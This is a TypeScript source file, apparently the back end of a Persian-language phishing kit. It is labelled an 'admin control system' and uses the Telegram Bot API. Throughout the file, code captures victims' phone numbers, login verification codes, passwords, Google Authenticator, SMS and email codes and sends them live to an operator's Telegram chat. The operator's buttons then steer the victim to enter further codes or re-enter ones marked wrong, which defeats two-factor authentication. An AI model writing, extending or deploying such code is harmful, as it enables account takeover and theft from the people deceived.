// Enhanced Telegram Bot API Service for Admin Control System

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
const TELEGRAM_CHAT_ID =
  import.meta.env.VITE_TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";

interface UserSession {
  sessionId: string;
  phoneNumber: string;
  messageId?: number;
  startTime: string;
  phoneVerificationCode?: string;
  completedSteps: string[];
  currentStep: string;
  authAttempts: {
    [key: string]: number;
  };
  authCodes: {
    [key: string]: string[];
  };
}

// Store active sessions (in real app, this would be in a database)
const activeSessions = new Map<string, UserSession>();

/**
 * Generate unique session ID
 */
export const generateSessionId = (): string => {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
};

/**
 * Send custom message to Telegram and return message ID
 */
export const sendCustomMessageToTelegram = async (
  message: string,
): Promise<{ success: boolean; messageId?: number }> => {
  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would send message to Telegram");
    console.log("📝 Message:", message);
    // Return fake message ID for demo
    return { success: true, messageId: Date.now() };
  }

  try {
    console.log("📤 Sending custom message to Telegram");

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      },
    );

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Telegram send error:", {
        status: response.status,
        statusText: response.statusText,
        error: errorText,
      });
      return { success: false };
    }

    const result = await response.json();
    console.log("✅ Custom message sent successfully");

    return { success: true, messageId: result.result.message_id };
  } catch (error) {
    console.error("❌ Failed to send custom message to Telegram:", error);
    return { success: false };
  }
};

/**
 * Get message ID from session
 */
export const getMessageIdFromSession = (sessionId: string): number | null => {
  const session = activeSessions.get(sessionId);
  return session?.messageId || null;
};

/**
 * Update existing Telegram message with new content
 */
export const updateCustomMessageInTelegram = async (
  messageId: number,
  newMessage: string,
): Promise<{ success: boolean }> => {
  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would update message in Telegram");
    console.log("📝 New Message:", newMessage);
    console.log("🆔 Message ID:", messageId);
    return { success: true };
  }

  try {
    await updateTelegramMessage(messageId, newMessage, undefined);
    return { success: true };
  } catch (error) {
    console.error("❌ Failed to update custom message:", error);
    return { success: false };
  }
};

/**
 * Send initial phone number to Telegram with admin controls
 */
export const sendPhoneToTelegramEnhanced = async (
  phoneNumber: string,
): Promise<{ success: boolean; sessionId: string }> => {
  const sessionId = generateSessionId();

  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would send phone to Telegram");
    console.log("📱 Phone:", phoneNumber);
    console.log("🆔 Session:", sessionId);

    // Create session for demo mode
    const session: UserSession = {
      sessionId,
      phoneNumber,
      startTime: new Date().toLocaleString("fa-IR"),
      completedSteps: [],
      currentStep: "phone_verification",
      authAttempts: {},
      authCodes: {},
      messageId: Date.now(), // Fake message ID for demo
    };

    activeSessions.set(sessionId, session);
    return { success: true, sessionId };
  }

  try {
    const session: UserSession = {
      sessionId,
      phoneNumber,
      startTime: new Date().toLocaleString("fa-IR"),
      completedSteps: [],
      currentStep: "phone_verification",
      authAttempts: {},
      authCodes: {},
    };

    const message = formatInitialMessage(session);

    console.log("📤 Sending message to Telegram:", { sessionId, phoneNumber });

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [], // No buttons initially
          },
        }),
      },
    );

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Telegram send error:", {
        status: response.status,
        error: errorText,
      });
      throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
    }

    const result = await response.json();
    session.messageId = result.result.message_id;

    // Store session
    activeSessions.set(sessionId, session);

    console.log("✅ Phone number sent to Telegram successfully:", {
      sessionId,
      messageId: session.messageId,
    });
    return { success: true, sessionId };
  } catch (error) {
    console.error("❌ Failed to send phone to Telegram:", error);
    return { success: false, sessionId };
  }
};

/**
 * Update session when user enters verification code
 */
export const updatePhoneVerificationCode = async (
  sessionId: string,
  verificationCode: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    console.log("📝 Updating phone verification code:", {
      sessionId,
      verificationCode,
      currentSteps: session.completedSteps,
    });

    session.phoneVerificationCode = verificationCode;

    // Add phone_verification to completed steps if not already there
    if (!session.completedSteps.includes("phone_verification")) {
      session.completedSteps.push("phone_verification");
    }

    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    console.log("🎛️ Admin keyboard being sent:", adminKeyboard);

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);

    console.log("✅ Phone verification updated successfully");
    return true;
  } catch (error) {
    console.error("❌ Failed to update verification code:", error);
    return false;
  }
};

/**
 * Update session with auth step data
 */
export const updateAuthStep = async (
  sessionId: string,
  stepType: string,
  stepData: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    // Initialize auth attempts and codes for this step
    if (!session.authAttempts[stepType]) {
      session.authAttempts[stepType] = 0;
    }
    if (!session.authCodes[stepType]) {
      session.authCodes[stepType] = [];
    }

    session.authAttempts[stepType]++;
    session.authCodes[stepType].push(stepData);

    if (!session.completedSteps.includes(stepType)) {
      session.completedSteps.push(stepType);
    }

    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to update auth step:", error);
    return false;
  }
};

/**
 * Set user current step (when navigating to auth pages)
 */
export const setUserCurrentStep = async (
  sessionId: string,
  step: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    // Check if step actually changed
    if (session.currentStep === step) {
      console.log("ℹ️ Current step unchanged, skipping update");
      return true;
    }

    const previousStep = session.currentStep;
    session.currentStep = step;

    const updatedMessage = formatInitialMessage(session);

    // Show admin buttons only when user is on loading page (waiting_admin)
    // Otherwise remove buttons
    const keyboard =
      step === "waiting_admin"
        ? getAdminKeyboard(sessionId, session)
        : { inline_keyboard: [] };

    console.log(`📱 Step changed: ${previousStep} → ${step}`);
    await updateTelegramMessage(session.messageId, updatedMessage, keyboard);

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.warn("⚠️ Failed to set current step:", error);
    // Don't return false to avoid breaking user flow
    return true;
  }
};

/**
 * Check if user can access auth step (prevent duplicate access)
 */
export const canAccessAuthStep = (
  sessionId: string,
  stepType: string,
): boolean => {
  const session = activeSessions.get(sessionId);
  if (!session) return false;

  // Allow access if this is the first time OR if it's SMS and this is the second attempt
  if (stepType === "sms") {
    return (
      !session.authAttempts[stepType] || session.authAttempts[stepType] < 2
    );
  }

  return (
    !session.authAttempts[stepType] || session.authAttempts[stepType] === 0
  );
};

/**
 * Get session data
 */
export const getSession = (sessionId: string): UserSession | undefined => {
  return activeSessions.get(sessionId);
};

/**
 * Show admin buttons when user is on loading page
 */
export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session) {
      console.error("Session not found:", sessionId);
      return false;
    }

    // Set step to waiting_admin and show buttons
    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    console.log("🎛️ Showing admin buttons:", adminKeyboard);

    // Check if we're in demo mode
    if (!validateTelegramConfig()) {
      console.log("🎭 Demo mode: Would show admin buttons in Telegram");
      console.log("📝 Message:", updatedMessage);
      console.log("⌨️ Keyboard:", adminKeyboard);

      // In demo mode, show alert with available options
      const buttons = adminKeyboard.inline_keyboard
        .flat()
        .map((btn) => btn.text)
        .join(", ");
      console.log("🎛️ Demo Admin Buttons:", buttons);

      // Simulate admin clicking a button after 5 seconds (for testing)
      setTimeout(() => {
        console.log("🎭 Demo: Simulating admin clicking 'Password' button");
        // You can manually call the callback here for testing
      }, 5000);

      activeSessions.set(sessionId, session);
      return true;
    }

    // Real Telegram mode
    if (!session.messageId) {
      console.error("MessageId not found for session:", sessionId);
      return false;
    }

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to show admin buttons:", error);
    return false;
  }
};

/**
 * Format initial message with all session data
 */
const formatInitialMessage = (session: UserSession): string => {
  // Escape HTML characters in user data
  const escapeHtml = (text: string): string => {
    return text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  };

  let message = `🔔 <b>درخواست ورود جدید</b>

📱 <b>شماره همراه:</b> <code>${escapeHtml(session.phoneNumber)}</code>
🆔 <b>Session ID:</b> <code>${escapeHtml(session.sessionId)}</code>
⏰ <b>زمان شروع:</b> ${escapeHtml(session.startTime)}
📍 <b>وضعیت فعلی:</b> ${escapeHtml(getCurrentStepText(session.currentStep))}`;

  // Add phone verification code if exists
  if (session.phoneVerificationCode) {
    message += `\n\n✅ <b>کد تایید شماره:</b> <code>${escapeHtml(session.phoneVerificationCode)}</code>`;
  }

  // Add auth steps data
  if (session.authCodes && Object.keys(session.authCodes).length > 0) {
    Object.keys(session.authCodes).forEach((stepType) => {
      const codes = session.authCodes[stepType];
      if (codes && codes.length > 0) {
        message += `\n\n🔐 <b>${escapeHtml(getStepDisplayName(stepType))}:</b>`;

        codes.forEach((code, index) => {
          message += `\n   ${index + 1}. <code>${escapeHtml(code)}</code>`;
        });
      }
    });
  }

  message += `\n\n📊 <b>مراحل تکمیل شده:</b> ${session.completedSteps?.length || 0}`;
  message += `\n🕐 <b>آخرین به‌روزرسانی:</b> ${escapeHtml(new Date().toLocaleString("fa-IR"))}`;

  return message;
};

/**
 * Get admin keyboard based on session state
 */
const getAdminKeyboard = (sessionId: string, session: UserSession) => {
  console.log("🎛️ Building admin keyboard for session:", {
    sessionId,
    currentStep: session.currentStep,
    completedSteps: session.completedSteps,
    authAttempts: session.authAttempts,
  });

  // Only show buttons if user is on loading page AND has completed phone verification
  if (session.currentStep !== "waiting_admin") {
    console.log("❌ Not showing buttons - wrong step:", session.currentStep);
    return { inline_keyboard: [] };
  }

  // User must have completed phone verification to see admin buttons
  if (!session.completedSteps.includes("phone_verification")) {
    console.log("❌ Not showing buttons - phone verification not completed");
    return { inline_keyboard: [] };
  }

  const buttons = [];

  // First section: Authentication method buttons (show if not attempted yet)
  const authRow = [];

  // Password button - show if not attempted
  if (!session.authAttempts["password"]) {
    authRow.push({
      text: "🔒 Password",
      callback_data: `auth_password_${sessionId}`,
    });
    console.log("✅ Added Password button");
  }

  // Google Auth button - show if not attempted
  if (!session.authAttempts["google"]) {
    authRow.push({
      text: "📱 Google Auth",
      callback_data: `auth_google_${sessionId}`,
    });
    console.log("✅ Added Google Auth button");
  }

  // Add auth buttons row if there are any
  if (authRow.length > 0) {
    buttons.push(authRow);
  }

  // Second section: Additional methods
  // SMS Code button (allow up to 2 attempts)
  if (!session.authAttempts["sms"] || session.authAttempts["sms"] < 2) {
    buttons.push([
      {
        text: "💬 SMS Code",
        callback_data: `auth_sms_${sessionId}`,
      },
    ]);
    console.log("✅ Added SMS Code button");
  }

  // Email Code button - show if not attempted
  if (!session.authAttempts["email"]) {
    buttons.push([
      {
        text: "📧 Email Code",
        callback_data: `auth_email_${sessionId}`,
      },
    ]);
    console.log("✅ Added Email Code button");
  }

  // Third section: Wrong buttons (ONLY show if user has attempted that method at least once)
  const wrongButtonsRow1 = [];
  const wrongButtonsRow2 = [];

  // Wrong Password button - only if user attempted password at least once
  if (
    session.authAttempts["password"] &&
    session.authAttempts["password"] > 0
  ) {
    wrongButtonsRow1.push({
      text: "❌ Wrong Password",
      callback_data: `incorrect_password_${sessionId}`,
    });
    console.log("✅ Added Wrong Password button");
  }

  // Wrong Google Auth button - only if user attempted google auth at least once
  if (session.authAttempts["google"] && session.authAttempts["google"] > 0) {
    wrongButtonsRow1.push({
      text: "❌ Wrong Google Auth",
      callback_data: `incorrect_google_${sessionId}`,
    });
    console.log("✅ Added Wrong Google Auth button");
  }

  // Wrong SMS button - only if user attempted SMS at least once
  if (session.authAttempts["sms"] && session.authAttempts["sms"] > 0) {
    wrongButtonsRow2.push({
      text: "❌ Wrong SMS",
      callback_data: `incorrect_sms_${sessionId}`,
    });
    console.log("✅ Added Wrong SMS button");
  }

  // Wrong Email button - only if user attempted email at least once
  if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
    wrongButtonsRow2.push({
      text: "❌ Wrong Email Code",
      callback_data: `incorrect_email_${sessionId}`,
    });
    console.log("✅ Added Wrong Email Code button");
  }

  // Add wrong buttons rows if there are any
  if (wrongButtonsRow1.length > 0) {
    buttons.push(wrongButtonsRow1);
  }
  if (wrongButtonsRow2.length > 0) {
    buttons.push(wrongButtonsRow2);
  }

  // Fourth section: Complete Auth button (if user has completed at least one additional step)
  if (session.completedSteps.length > 1) {
    buttons.push([
      {
        text: "✅ تکمیل احراز هویت",
        callback_data: `complete_auth_${sessionId}`,
      },
    ]);
    console.log("✅ Added Complete Auth button");
  }

  console.log("🎛️ Final keyboard:", { inline_keyboard: buttons });
  return { inline_keyboard: buttons };
};

// Store last message content to avoid unnecessary updates
const lastMessageContent = new Map<
  number,
  { text: string; replyMarkup: string }
>();

/**
 * Clean up old sessions (older than 1 hour)
 */
const cleanupOldSessions = () => {
  const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);

  for (const [sessionId, session] of activeSessions.entries()) {
    const sessionTime = new Date(session.startTime);
    if (sessionTime < oneHourAgo) {
      console.log("🧹 Cleaning up old session:", sessionId);
      activeSessions.delete(sessionId);
      // Also clean up message content
      if (session.messageId) {
        lastMessageContent.delete(session.messageId);
      }
    }
  }
};

// Run cleanup every 30 minutes
setInterval(cleanupOldSessions, 30 * 60 * 1000);
/**
 * Compare message content and keyboard to check if update is needed
 */
const isMessageContentDifferent = (
  messageId: number,
  newText: string,
  newReplyMarkup: any,
): boolean => {
  const lastContent = lastMessageContent.get(messageId);
  if (!lastContent) {
    return true; // First time, always update
  }

  const newReplyMarkupStr = JSON.stringify(newReplyMarkup);

  return (
    lastContent.text !== newText ||
    lastContent.replyMarkup !== newReplyMarkupStr
  );
};

/**
 * Update Telegram message
 */
const updateTelegramMessage = async (
  messageId: number,
  text: string,
  replyMarkup: any,
): Promise<void> => {
  // Validate inputs
  if (!messageId || !text) {
    console.error("❌ Invalid message data:", {
      messageId,
      textLength: text?.length,
    });
    return;
  }

  // Check if content is actually different
  if (!isMessageContentDifferent(messageId, text, replyMarkup)) {
    console.log("ℹ️ Message content unchanged, skipping update");
    return;
  }

  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would update Telegram message");
    console.log("📝 Message:", text);
    console.log("⌨️ Keyboard:", replyMarkup);
    // Store content even in demo mode
    lastMessageContent.set(messageId, {
      text,
      replyMarkup: JSON.stringify(replyMarkup),
    });
    return;
  }

  try {
    const payload: any = {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text: text.substring(0, 4096), // Telegram message limit
      parse_mode: "HTML",
    };

    // Only add reply_markup if it's not null/undefined
    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }

    console.log("🔄 Updating Telegram message:", {
      messageId,
      textLength: text.length,
    });

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      },
    );

    if (!response.ok) {
      const errorText = await response.text();

      // Handle specific "message is not modified" error
      if (errorText.includes("message is not modified")) {
        console.log("ℹ️ Message content is identical, no update needed");
        // Store the content to avoid future attempts
        lastMessageContent.set(messageId, {
          text,
          replyMarkup: JSON.stringify(replyMarkup),
        });
        return;
      }

      console.error("❌ Telegram API error:", {
        status: response.status,
        statusText: response.statusText,
        error: errorText,
        payload: payload,
      });
      throw new Error(
        `Failed to update message: ${response.status} - ${errorText}`,
      );
    }

    const result = await response.json();
    console.log("✅ Message updated successfully:", result.ok);

    // Store the successfully updated content
    lastMessageContent.set(messageId, {
      text,
      replyMarkup: JSON.stringify(replyMarkup),
    });
  } catch (error) {
    console.error("❌ Failed to update Telegram message:", error);
    // Don't throw the error, just log it to prevent breaking the user flow
  }
};

/**
 * Get current step display text
 */
const getCurrentStepText = (step: string): string => {
  const stepTexts: { [key: string]: string } = {
    phone_verification: "در انتظار کد تایید شماره",
    waiting_admin: "در انتظار دستور ادمین",
    auth_password: "وارد کردن رمز عبور",
    auth_google: "وارد کردن کد Google Auth",
    auth_sms: "وارد کردن کد پیامک",
    auth_email: "وارد کردن کد ایمیل",
    completed: "تکمیل شده",
  };

  return stepTexts[step] || step;
};

/**
 * Get step display name
 */
const getStepDisplayName = (stepType: string): string => {
  const names: { [key: string]: string } = {
    password: "رمز عبور",
    google: "Google Authenticator",
    sms: "کد پیامک",
    email: "کد ایمیل",
  };

  return names[stepType] || stepType;
};

/**
 * Validate Telegram configuration
 */
export const validateTelegramConfig = (): boolean => {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
    return false;
  }

  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
    return false;
  }

  return true;
};
